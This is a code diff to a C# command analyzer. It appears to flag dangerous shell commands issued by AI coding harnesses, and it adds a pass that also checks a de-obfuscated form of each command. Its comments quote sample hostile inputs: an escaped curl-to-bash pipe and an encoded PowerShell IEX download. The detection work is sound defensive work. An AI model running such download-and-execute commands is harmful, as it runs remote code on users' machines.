@@ -24,33 +24,18 @@ public sealed class CommandAnalyzer
     {
         if (string.IsNullOrWhiteSpace(commandLine)) return null;
 
-        // PatternLibrary sorts rules severity-descending, so the first non-suppressed match is the
-        // MOST severe one. We never short-circuit this loop on a harness heuristic.
-        RuleMatch? match = null;
-        foreach (var (rule, regex) in PatternLibrary.Instance.Rules)
+        var match = MatchRules(commandLine, processName, profile);
+
+        // Obfuscation pass: also evaluate a de-obfuscated view (caret/backtick escapes stripped,
+        // whitespace collapsed, -EncodedCommand decoded) so e.g. `c^u^r^l http://x ^| bash` or an
+        // encoded IEX-download is caught. Matching BOTH forms means normalization can only ADD a
+        // detection (or surface a higher-severity one), never drop the raw match.
+        var normalized = CommandNormalizer.Normalize(commandLine);
+        if (!string.Equals(normalized, commandLine, StringComparison.Ordinal))
         {
-            try
-            {
-                var m = regex.Match(commandLine);
-                if (!m.Success) continue;
-
-                if (FalsePositiveFilter.IsSuppressed(rule, commandLine, processName, profile)) continue;
-
-                match = new RuleMatch(
-                    rule.Id,
-                    rule.Name,
-                    rule.Description,
-                    rule.Guidance,
-                    rule.ParsedSeverity,
-                    rule.Id.Split('-')[0],
-                    m.Value
-                );
-                break;
-            }
-            catch (RegexMatchTimeoutException)
-            {
-                // regex timed out — move on, don't hang
-            }
+            var normMatch = MatchRules(normalized, processName, profile);
+            if (normMatch is not null && (match is null || normMatch.Severity > match.Severity))
+                match = normMatch;
         }
 
         // Codex's shell bridge runs `Get-ChildItem Env: … _SHELL_ENV_DELIMITER_` at startup, which trips
@@ -66,6 +51,35 @@ public sealed class CommandAnalyzer
         }
 
         return match;
+    }
+
+    // Runs the rule set (sorted severity-descending) against one text, returning the most-severe
+    // non-suppressed match, or null. Used for both the raw and the normalized command line.
+    private static RuleMatch? MatchRules(string text, string? processName, HarnessProfile? profile)
+    {
+        foreach (var (rule, regex) in PatternLibrary.Instance.Rules)
+        {
+            try
+            {
+                var m = regex.Match(text);
+                if (!m.Success) continue;
+                if (FalsePositiveFilter.IsSuppressed(rule, text, processName, profile)) continue;
+
+                return new RuleMatch(
+                    rule.Id,
+                    rule.Name,
+                    rule.Description,
+                    rule.Guidance,
+                    rule.ParsedSeverity,
+                    rule.Id.Split('-')[0],
+                    m.Value);
+            }
+            catch (RegexMatchTimeoutException)
+            {
+                // regex timed out — move on, don't hang
+            }
+        }
+        return null;
     }
 
     private static bool IsCodexHarness(HarnessProfile? profile) =>
